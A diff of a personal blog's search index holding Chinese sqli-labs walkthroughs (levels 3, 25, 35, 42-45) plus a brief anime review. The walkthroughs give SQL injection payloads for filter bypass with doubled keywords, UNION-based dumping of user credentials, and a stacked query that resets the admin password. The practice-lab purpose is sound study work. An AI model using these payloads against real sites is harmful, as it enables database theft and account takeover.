+从这个函数可以发现，or和and被替换成空了，但这个替换只会检查一次所有字符，将字符里的所有含or或and的字符替换成空字符。<br>下面尝试注入</li>
+</ol>
+<p><code>?id=1</code><br>返回正常<br><code>?id=1&#39;</code><br>返回错误<br>因此可以以这种方式注入<code> ?id=1&#39; --+ </code><br>但要注意，语句中存在or字符时，需要写成oorr，这样中间的or被替换为空字符后，剩下的字符仍然能构成or<br>and字符也是同理<br>By the way, 函数只是把or和and字符过滤，但和or字符相同含义的||没有被过滤，and字符相同含义的&amp;&amp;没有被过滤。因此有时也可用||和&amp;&amp;代替。</p>
+<ol start="2">
+<li><p>猜解SQL查询语句中的字段数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;oorrder by 4 --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>爆出显示位</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取当前数据库名和数据库版本号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version() --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,passwoorrd) from users --+</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="第25a关"><a href="#第25a关" class="headerlink" title="第25a关"></a>第25a关</h2><p>与25关类似，只是没有单引号</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>新知识+1</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-labs_26+26a</title>
     <url>/2022/11/17/sqli-labs_26+26a/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>相当于前一关的加强版？</p>
@@ -2729,49 +2940,6 @@ gopher发送get请求</li>
 </ol>
 <h2 id="第27a关"><a href="#第27a关" class="headerlink" title="第27a关"></a>第27a关</h2><p>与27关相比，只是闭合方式变更为”</p>
 <h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>a piece of cake~</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>sqli-labs</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-labs_25+25a</title>
-    <url>/2022/11/17/sqli-labs_25+25a/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关页面上有明显提示，可以巧妙利用一下</p>
-<span id="more"></span>
-
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li>测试并判断注入类型<br>首先本关页面出现了明显提示，or和and似乎都不能使用了。但我们检查源码时，我们可以发现这一段函数<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-从这个函数可以发现，or和and被替换成空了，但这个替换只会检查一次所有字符，将字符里的所有含or或and的字符替换成空字符。<br>下面尝试注入</li>
-</ol>
-<p><code>?id=1</code><br>返回正常<br><code>?id=1&#39;</code><br>返回错误<br>因此可以以这种方式注入<code> ?id=1&#39; --+ </code><br>但要注意，语句中存在or字符时，需要写成oorr，这样中间的or被替换为空字符后，剩下的字符仍然能构成or<br>and字符也是同理<br>By the way, 函数只是把or和and字符过滤，但和or字符相同含义的||没有被过滤，and字符相同含义的&amp;&amp;没有被过滤。因此有时也可用||和&amp;&amp;代替。</p>
-<ol start="2">
-<li><p>猜解SQL查询语句中的字段数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;oorrder by 4 --+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>爆出显示位</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>获取当前数据库名和数据库版本号</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version() --+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,passwoorrd) from users --+</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="第25a关"><a href="#第25a关" class="headerlink" title="第25a关"></a>第25a关</h2><p>与25关类似，只是没有单引号</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>新知识+1</p>
 <h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
 ]]></content>
       <categories>
@@ -2871,6 +3039,42 @@ gopher发送get请求</li>
       </tags>
   </entry>
   <entry>
+    <title>sqli-labs_3</title>
+    <url>/2022/11/08/sqli-labs_3/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有了过第1，2关的基础，现在再往后看就比较轻松了。</p>
+<span id="more"></span>
+
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1’后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_3.png" alt="报错信息"></p>
+</li>
+<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘’1’’) LIMIT 0,1’ at line 1<br>可知，sql语句是单引号字符型且有括号。<br>所以我们也需要闭合单引号和括号。<br>则构造语句如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=2&#x27;)--+</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p>
+<ol start="3">
+<li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;) order by 3--+</span><br></pre></td></tr></table></figure></li>
+<li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li>
+<li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li>
+<li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li>
+<li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
+<li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
+<li>此笔记为笔者初学sql注入时所写</li>
+<li>本关重点在于通过报错信息判断sql语句</li>
+</ul>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-labs_32+33</title>
     <url>/2022/11/18/sqli-labs_32+33/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关涉及到了编码格式</p>
@@ -2933,31 +3137,35 @@ gopher发送get请求</li>
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs_3</title>
-    <url>/2022/11/08/sqli-labs_3/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有了过第1，2关的基础，现在再往后看就比较轻松了。</p>
+    <title>sqli-labs_35</title>
+    <url>/2022/11/18/sqli-labs_35/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>题目的提示已经很明显了</p>
 <span id="more"></span>
-
 <h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1’后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_3.png" alt="报错信息"></p>
+<li><p>测试并判断注入类型<br>查看源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
+<p>通过这段源码，我们可以知道，id没有被单引号括起来所以addslashes起不到作用<br>直接payload即可</p>
 </li>
-<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘’1’’) LIMIT 0,1’ at line 1<br>可知，sql语句是单引号字符型且有括号。<br>所以我们也需要闭合单引号和括号。<br>则构造语句如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=2&#x27;)--+</span><br></pre></td></tr></table></figure></li>
+<li><p>猜解SQL查询语句中的字段数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 order by 4 --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>爆出显示位</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取当前数据库名和数据库版本号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,version(),database() --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,(select group_concat(username,0x3a,password) from users) #</span><br></pre></td></tr></table></figure></li>
 </ol>
-<p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p>
-<ol start="3">
-<li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;) order by 3--+</span><br></pre></td></tr></table></figure></li>
-<li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li>
-<li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li>
-<li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li>
-<li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
-<li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
-<li>此笔记为笔者初学sql注入时所写</li>
-<li>本关重点在于通过报错信息判断sql语句</li>
-</ul>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>看破陷阱后，其实很简单</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -3019,46 +3227,6 @@ gopher发送get请求</li>
 <h3 id="burp注入的另一种方案，在Hex栏修改16进制注入为df。"><a href="#burp注入的另一种方案，在Hex栏修改16进制注入为df。" class="headerlink" title="burp注入的另一种方案，在Hex栏修改16进制注入为df。"></a>burp注入的另一种方案，在Hex栏修改16进制注入为df。</h3><p>可参见：<a href="https://blog.csdn.net/m0_62879498/article/details/122558222">sql-lab (32~35)包含对 宽字节注入的原理理解及注意事项</a><br>虽然不算很实用的方法，但也不失为一种有趣的思路。</p>
 <h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>稍微改了个形式罢了，不足挂齿</p>
 <h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_41420747/article/details/81836327">sqli-lab教程——1-35通关Writeup</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>sqli-labs</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-labs_35</title>
-    <url>/2022/11/18/sqli-labs_35/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>题目的提示已经很明显了</p>
-<span id="more"></span>
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>测试并判断注入类型<br>查看源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
-<p>通过这段源码，我们可以知道，id没有被单引号括起来所以addslashes起不到作用<br>直接payload即可</p>
-</li>
-<li><p>猜解SQL查询语句中的字段数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 order by 4 --+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>爆出显示位</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>获取当前数据库名和数据库版本号</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,version(),database() --+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,(select group_concat(username,0x3a,password) from users) #</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>看破陷阱后，其实很简单</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -3205,43 +3373,6 @@ mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs_42-45</title>
-    <url>/2022/11/19/sqli-labs_42-45/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末学习的开始</p>
-<span id="more"></span>
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>测试并判断注入类型<br>查看源码，在login.php中注意到这样的语句</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br></pre></td></tr></table></figure>
-<p>我们可以发现，username被过滤了，但是password没有被过滤<br>因此我们可以考虑从password处进行注入<br>然后，通过对堆叠注入的尝试，我们发现也是可行的。<br>于是，我们可以有两种方式。<br>一是常规方式，二是通过堆叠注入修改管理员密码从而登录</p>
-</li>
-<li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; #</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password),2 from users #</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>修改管理员密码(可以直接做)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;update users set password=&#x27;111111&#x27;  where username=&#x27;admin&#x27;#</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="第43关"><a href="#第43关" class="headerlink" title="第43关"></a>第43关</h2><p>与第42关差不多，只不过闭合方式为’)</p>
-<h2 id="第44关"><a href="#第44关" class="headerlink" title="第44关"></a>第44关</h2><p>与第42关差不多，只是不能使用报错注入</p>
-<h2 id="第45关"><a href="#第45关" class="headerlink" title="第45关"></a>第45关</h2><p>与第43关差不多，只是闭合方式为’)</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>向前走,不回头~</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_43395215/article/details/108245668">sqli-labs(38-53)</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>sqli-labs</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqli-labs_46+47</title>
     <url>/2022/11/19/sqli-labs_46+47/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前面连续几关相似，这一回终于有新内容了。</p>
@@ -3273,6 +3404,43 @@ mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用
 <h2 id="第47关"><a href="#第47关" class="headerlink" title="第47关"></a>第47关</h2><p>与第46关相比差不多，只是闭合方式为’</p>
 <h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>有些时候注入的方式不止一种，我们只需选择自己最擅长以及最迅速有效的方法即可</p>
 <h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107643024">sqli-labs大详解（完结）</a><br><a href="https://blog.csdn.net/qq_43395215/article/details/108245668">sqli-labs(38-53)</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs_42-45</title>
+    <url>/2022/11/19/sqli-labs_42-45/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末学习的开始</p>
+<span id="more"></span>
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>测试并判断注入类型<br>查看源码，在login.php中注意到这样的语句</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br></pre></td></tr></table></figure>
+<p>我们可以发现，username被过滤了，但是password没有被过滤<br>因此我们可以考虑从password处进行注入<br>然后，通过对堆叠注入的尝试，我们发现也是可行的。<br>于是，我们可以有两种方式。<br>一是常规方式，二是通过堆叠注入修改管理员密码从而登录</p>
+</li>
+<li><p><strong>爆表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; #</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password),2 from users #</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>修改管理员密码(可以直接做)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;update users set password=&#x27;111111&#x27;  where username=&#x27;admin&#x27;#</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="第43关"><a href="#第43关" class="headerlink" title="第43关"></a>第43关</h2><p>与第42关差不多，只不过闭合方式为’)</p>
+<h2 id="第44关"><a href="#第44关" class="headerlink" title="第44关"></a>第44关</h2><p>与第42关差不多，只是不能使用报错注入</p>
+<h2 id="第45关"><a href="#第45关" class="headerlink" title="第45关"></a>第45关</h2><p>与第43关差不多，只是闭合方式为’)</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>向前走,不回头~</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_43395215/article/details/108245668">sqli-labs(38-53)</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -3903,6 +4071,35 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
+    <title>孤独摇滚--忐忑不安的吉他英雄</title>
+    <url>/2022/12/26/%E5%AD%A4%E7%8B%AC%E6%91%87%E6%BB%9A%E5%8A%A8%E7%94%BB/</url>
+    <content><![CDATA[<p><img src="/images/band_2.png" alt="band"></p>
+<span id="more"></span>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>也许是今年看得最开心的新作动画。</p>
+<h1 id="第一印象"><a href="#第一印象" class="headerlink" title="第一印象"></a>第一印象</h1><p>孤独摇滚是芳文社出版的四格漫画，老实说，虽然早就知道将要出动画，由于四格漫画画面太小，让人难以看进去，于是也就没有预先看漫画了。<br>看pv时，其实没有特别在意啦，只是预感会是一部还不错的动画，没想到最终大大超出预期，是一个很棒的惊喜~</p>
+<h1 id="精妙的演出"><a href="#精妙的演出" class="headerlink" title="精妙的演出"></a>精妙的演出</h1><p>应当好好感谢制作组，如果中规中矩按照原作制作动画，大概会是中上水准，可却难以成为大多数人每周最期待的一部动画吧。<br>看动画时第一重要的是有趣，而动画也的确非常有趣，无论是在喜剧部分还是推动情节发展的地方都是“各司其职”，有条不紊。既不让人觉得混乱，也能看得十分开心。</p>
+<ul>
+<li><strong>创新性</strong><br>第1话运用的几个不同寻常的镜头很是吸引我：超广角，腿部运动镜头。这些对我来说都有一种新奇的美感。<br>不止如此，在乐队演奏方面也是不走寻常路，比如第8话十分重要的乐队演出，一般而言，这种重要的情景都会把其演奏过程制作得具有观赏性，而制作组明知这一点还是将一个很“烂”的live完全表现出来了。不得不说，虽然在演奏上是失败的，但如此大胆的策略让剧情更加自然，也一定会被很多人记住吧。</li>
+<li><strong>想象力</strong><br>想象力是演出有趣与否的重要因素，在这方面，制作组拿出了：写实场景的水坝，3D建模，毕加索画作…一系列让人眼前一亮的元素，令人赞不绝口！</li>
+<li><strong>契合度</strong><br>人物方面的契合度至少90%以上。波奇的声优甚至就是社恐，更是有一种声优与角色融为一体的感觉。我认为选择这样的声优比选知名声优好多了，无论一个声优多么有人气或是多么美丽，只要不适合，都应当一票否决。</li>
+</ul>
